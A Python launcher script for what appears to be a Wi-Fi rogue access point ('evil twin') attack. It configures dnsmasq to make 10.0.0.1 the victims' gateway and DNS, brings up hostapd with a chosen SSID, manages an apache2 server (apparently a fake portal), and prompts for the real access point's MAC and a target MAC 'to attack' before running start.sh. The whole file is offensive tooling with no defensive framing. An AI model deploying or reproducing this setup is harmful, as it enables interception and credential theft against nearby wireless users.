#!/usr/bin/python

from utils import (set_configs , display_configs , kill_daemons , bash_command , HostAPD , DNSMasq , APACHE2)

def main():

    configs = set_configs()
    display_configs(configs)
    kill_daemons()

    hostapd = HostAPD.get_instance()
    dnsmasq = DNSMasq.get_instance()
    apache2 = APACHE2.get_instance()

    # configure dnsmasq
    print ('[*] Configuring dnsmasq')
    dnsmasq.configure(configs['phys'],
                    '10.0.0.0,10.0.0.250,12h',
                    dhcp_options=[ '3,10.0.0.1', '6,10.0.0.1' ])

    # configure hostpad
    print ('[*] Configuring hostapd')
    hostapd.configure(configs['phys'],
                    configs['ssid'],
                    configs['channel'])

    try:
        mac_ap = input('\nEnter the mac of the access point\n')
        mac_target = input('\nChoose the mac address you want to attack\n')
        bash_command('./start.sh {0} {1} {2} {3}'.format(configs['upstream'] , mac_target , mac_ap , configs['phys']))

    except KeyboardInterrupt:

        print ('\n\n[*] Exiting on user command.')
        
    print ('[*] Stopping dnsmasq.')
    dnsmasq.stop()
    print ('[*] Stopping hostapd.')
    hostapd.stop()
    print ('[*] Stopping apache2.')
    apache2.stop()

    bash_command('bash reset.sh')

if __name__ == '__main__':
    main()